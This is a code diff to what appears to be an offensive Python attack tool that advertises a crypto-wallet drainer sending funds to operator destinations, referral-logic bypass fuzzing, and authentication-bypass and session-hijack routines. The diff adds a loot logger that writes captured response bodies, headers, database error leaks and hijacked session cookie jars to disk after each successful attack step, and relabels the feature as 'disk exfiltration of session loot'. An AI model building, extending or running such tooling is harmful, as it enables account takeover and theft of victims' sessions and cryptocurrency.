@@ -13,7 +13,7 @@ Features:
 - Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
 - Automated Referral Validation Gateway Fuzzing Integration (test_referral.py)
 - Fully Synchronized Autonomous Cognitive Reasoning Operator (Active 36-Module Supreme Dispatcher)
-- Zero-disk in-memory intelligence collection & live terminal telemetry streaming
+- Immutable disk exfiltration of session loot and vulnerability artifacts (loot_output/)
 """
 import asyncio
 import json
@@ -37,6 +37,7 @@ from modules.live_login_verifier import execute_live_login_verification
 from modules.drainer import run_drainer_engine, OPERATOR_DESTINATIONS
 from modules.wallet_drain_probe import execute_probe
 from modules.telemetry import stream_proof
+from modules.loot_logger import save_session_loot
 
 # Import the referral validation bypass probe & Autonomous Cognitive Brain
 from modules.test_referral import audit_referral_logic
@@ -122,8 +123,6 @@ def error(message):
 def section(title):
     sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
     sys.stdout.flush()
-
-# (Removed global premature cognitive_brain instantiation to fix NameError)
 
 # ============================================================
 # TARGET HANDLING
@@ -228,6 +227,17 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
 
         stream_proof("AUTHENTICATION_BYPASS", endpoint, current_payload, body, extracted_proof or {"status": status})
 
+        # PERSIST LOOT TO DISK AUTOMATICALLY
+        save_session_loot(
+            target=target_url or "unknown_target",
+            endpoint=endpoint,
+            finding_type="AUTHENTICATION_BYPASS_SUCCESS",
+            status=status,
+            headers=headers,
+            body=body,
+            extra_loot=extracted_proof
+        )
+
         findings.append({
             "type": "AUTHENTICATION_BYPASS_SUCCESS",
             "evidence": f"Status {status} with verified non-SPA session payload",
@@ -238,6 +248,18 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
     for db_error in db_errors:
         sys.stdout.write(f"{YELLOW}[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...{RESET}\n")
         sys.stdout.flush()
+        
+        # PERSIST ERROR LOOT TO DISK
+        save_session_loot(
+            target=target_url or "unknown_target",
+            endpoint=endpoint,
+            finding_type=f"DATABASE_LEAK_{db_error.replace(' ', '_')}",
+            status=status,
+            headers=headers,
+            body=body,
+            extra_loot={"database_error": db_error}
+        )
+
         findings.append({
             "type": "POTENTIAL_DATABASE_INJECTION",
             "evidence": db_error,
@@ -267,6 +289,17 @@ def verify_hijacked_session(transport):
         if status == 200 and not is_spa_shell and len(body) > 10:
             stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": 200})
             success(f"[+] Session successfully verified against backend route: {endpoint}")
+            
+            # PERSIST SESSION HIJACK LOOT
+            save_session_loot(
+                target=transport.base_path,
+                endpoint=endpoint,
+                finding_type="SESSION_HIJACK_VERIFIED",
+                status=status,
+                headers=headers,
+                body=body,
+                extra_loot={"cookie_jar": dict(transport.cookie_jar)}
+            )
             return True
         else:
             sys.stdout.write(f"{RED}[-] Verification at {endpoint} returned status {status} or generic SPA shell.{RESET}\n")
